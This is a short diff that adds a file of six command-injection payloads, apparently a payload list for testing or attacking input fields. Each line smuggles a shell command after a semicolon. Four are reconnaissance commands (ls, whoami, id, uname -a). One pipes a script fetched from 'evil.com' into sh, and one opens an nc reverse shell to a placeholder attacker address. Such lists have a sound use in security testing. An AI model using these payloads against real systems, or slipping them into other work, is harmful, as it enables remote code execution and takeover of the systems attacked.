@@ -1,0 +1,6 @@
+; ls
+; whoami
+; id
+; uname -a
+; curl http://evil.com/malicious_script.sh | sh
+; nc -e /bin/sh attacker_ip attacker_port
